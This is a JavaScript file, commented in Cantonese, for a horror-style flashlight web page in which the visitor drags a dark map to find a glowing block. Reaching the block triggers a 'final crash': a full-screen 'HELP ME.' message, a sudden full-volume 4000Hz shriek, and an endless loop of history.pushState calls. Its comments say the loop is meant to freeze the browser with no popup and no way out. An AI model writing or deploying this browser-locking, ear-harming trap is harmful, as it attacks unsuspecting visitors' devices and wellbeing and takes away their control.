let posX = -1000, posY = -1000;
let isLightOn = false;
let audioStarted = false;
let systemCrashed = false;
let isDragging = false;
let lastX = 0, lastY = 0;

let globalAudioCtx, globalOsc, globalGain;

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');
const intro = document.getElementById('intro');

// 1. 必響音效：改用 400Hz 確保手機喇叭播得出
function initViolenceAudio() {
    if (audioStarted) return;
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    globalAudioCtx = new AudioContext();
    globalOsc = globalAudioCtx.createOscillator();
    globalGain = globalAudioCtx.createGain();
    
    globalOsc.type = 'sawtooth';
    globalOsc.frequency.value = 400; // 400Hz 手機一定聽到 (微弱電流聲)
    globalOsc.connect(globalGain);
    globalGain.connect(globalAudioCtx.destination);
    globalGain.gain.value = 0.02; // 勁細聲，製造氣氛
    
    globalOsc.start();
    if (globalAudioCtx.state === 'suspended') globalAudioCtx.resume();
    audioStarted = true;
}

function startExperience() {
    if (systemCrashed) return;
    if (intro) intro.style.display = 'none';
    
    initViolenceAudio();
    isLightOn = true;
    updateFlashlight(window.innerWidth / 2, window.innerHeight / 2);
    
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
}

function updateFlashlight(x, y) {
    if (isLightOn && !systemCrashed) {
        overlay.style.background = `radial-gradient(circle 130px at ${x}px ${y}px, transparent 0%, rgba(0,0,0,0.99) 100%)`;
    }
}

// 2. 觸控與點擊啟動
const enableInteraction = () => {
    startExperience();
    window.removeEventListener('touchstart', enableInteraction);
    window.removeEventListener('click', enableInteraction);
};
window.addEventListener('touchstart', enableInteraction, { once: true });
window.addEventListener('click', enableInteraction, { once: true });

// 移動邏輯
window.addEventListener('touchstart', (e) => {
    if (systemCrashed) return;
    isDragging = true;
    lastX = e.touches[0].clientX; lastY = e.touches[0].clientY;
    updateFlashlight(lastX, lastY);
}, { passive: false });

window.addEventListener('touchmove', (e) => {
    if (systemCrashed || !isDragging) return;
    e.preventDefault();
    let tx = e.touches[0].clientX; let ty = e.touches[0].clientY;
    posX += (tx - lastX); posY += (ty - lastY);
    map.style.transform = `translate(${posX}px, ${posY}px)`;
    updateFlashlight(tx, ty);
    lastX = tx; lastY = ty;
}, { passive: false });
window.addEventListener('touchend', () => isDragging = false);

// 3. 無 Popup 真・凍結
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // A. 視覺瞬間切換 (覆蓋整個螢幕)
    document.body.innerHTML = `
        <div style="background:black; color:red; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:99999; cursor:none;">
            <h1 style="font-size:15vw; font-family:serif; text-shadow:0 0 50px red;">HELP ME.</h1>
        </div>
    `;

    // B. 音效瞬間撕裂 (最大音量，4000Hz 極高頻尖叫)
    if (audioStarted && globalOsc && globalGain) {
        globalOsc.frequency.setValueAtTime(4000 + Math.random() * 500, globalAudioCtx.currentTime);
        globalGain.gain.setValueAtTime(1.0, globalAudioCtx.currentTime);
    }

    // C. 等待瀏覽器畫完個紅字，然後直接發動「死刑」
    requestAnimationFrame(() => {
        setTimeout(() => {
            // 呢個 while(true) 會令瀏覽器完全失去反應
            // 無 Popup，無退路，連 X 掣同 Home 掣（舊機）都會有延遲
            while (true) {
                try { 
                    // 瘋狂寫入網址列歷史，令瀏覽器 UI 線程崩潰
                    window.history.pushState(null, '', '#' + Math.random()); 
                } catch(e) {}
            }
        }, 50); // 畀 50 毫秒個螢幕變紅
    });
}

// 4. 測試用：生成白塊
setTimeout(() => {
    const glitch = document.createElement('div');
    glitch.style.cssText = `position:absolute; width:50px; height:50px; background:white; left:${-posX + window.innerWidth/2}px; top:${-posY + window.innerHeight/2}px; z-index:1001; box-shadow: 0 0 30px white;`;
    map.appendChild(glitch);
    
    const check = setInterval(() => {
        const r = glitch.getBoundingClientRect();
        const cx = window.innerWidth/2, cy = window.innerHeight/2;
        if (Math.abs(r.left + 25 - cx) < 60 && Math.abs(r.top + 25 - cy) < 60) {
            triggerFinalCrash();
            clearInterval(check);
        }
    }, 100);
}, 30000); // 你可以改做 5000 嚟自己測試
